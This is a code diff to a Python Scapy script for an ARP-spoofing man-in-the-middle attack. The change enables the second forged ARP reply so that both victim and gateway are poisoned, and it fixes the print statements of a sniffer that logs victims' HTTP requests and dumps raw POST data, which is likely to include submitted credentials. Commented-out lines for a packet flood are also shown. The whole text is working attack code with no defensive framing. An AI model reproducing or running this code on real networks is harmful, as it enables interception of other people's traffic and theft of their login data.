@@ -43,7 +43,7 @@ def reARP():
  
 def trick(gm, vm):
     send(ARP(op = 2, pdst = victimIP, psrc = gateIP, hwdst= vm))
-    #send(ARP(op = 2, pdst = gateIP, psrc = victimIP, hwdst= gm))
+    send(ARP(op = 2, pdst = gateIP, psrc = victimIP, hwdst= gm))
     #send(IP(src=victimIP, dst=gateIP)/ICMP()/"Hello World")
     #send(IP(src=victimIP, dst=gateIP)/TCP(sport=80, dport=80), count=10000)
 
@@ -70,11 +70,11 @@ def process_packet(packet):
         ip = packet[IP].src
         # get the request method
         method = packet[HTTPRequest].Method.decode()
-        print("\n{GREEN}[+] ", ip, "Requested ", url, " with ", method")
+        print("\n{GREEN}[+] ", ip, "Requested ", url, " with ", method)
         if show_raw and packet.haslayer(Raw) and method == "POST":
             # if show_raw flag is enabled, has raw data, and the requested method is "POST"
             # then show raw
-            print("\n{RED}[*] Some useful Raw data: ", packet[Raw].load")
+            print("\n{RED}[*] Some useful Raw data: ", packet[Raw].load)
     
             
 def mitm():
